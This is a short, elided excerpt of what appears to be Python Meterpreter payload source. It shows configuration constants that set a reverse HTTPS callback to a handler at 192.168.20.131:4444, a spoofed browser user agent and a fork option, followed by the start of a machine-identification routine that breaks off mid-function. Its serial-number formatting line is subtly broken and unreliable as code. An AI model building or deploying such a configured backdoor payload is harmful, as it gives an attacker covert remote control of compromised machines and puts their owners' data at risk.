...
DEBUGGING = False
TRY_TO_FORK = True
HTTP_CONNECTION_URL = 'https://192.168.20.131:4444/r40TXzGk-dKOdJtg0J-9KA1CjBLrC1dZuNztt7o8oj97XuRP5Qvg8z4y045oRV5RfWbYah-_sLCulW6kLBynhEjSuDndusU8p6dweN2QC90O6MDmwaUY6bXKxCi-I8Wqb1aeIg7bu_FlA1RkuO4qi5skUajiVltPOeOU6ZuFa2-6PMkgNTx1weTvOt14WIpwVvhLMqflnHS08ZDCZeqBZ0a8jz1woJUk1cSYuaWKHkp6SX1q0P8/'
HTTP_PROXY = None
HTTP_USER_AGENT = 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
HTTP_COOKIE = None
HTTP_HOST = None
HTTP_REFERER = None
PAYLOAD_UUID = '1fdb3cf1ab390bc1848b919fda60b7d7'
...
class PythonMeterpreter(object):
    ...
    def _core_machine_id(self, request, response):
        ...
        if has_windll:
            ...
            serial = "x" % ((serial_num >> 16) & 0xffff) + '-' "x" % (serial_num & 0xffff)
        else:
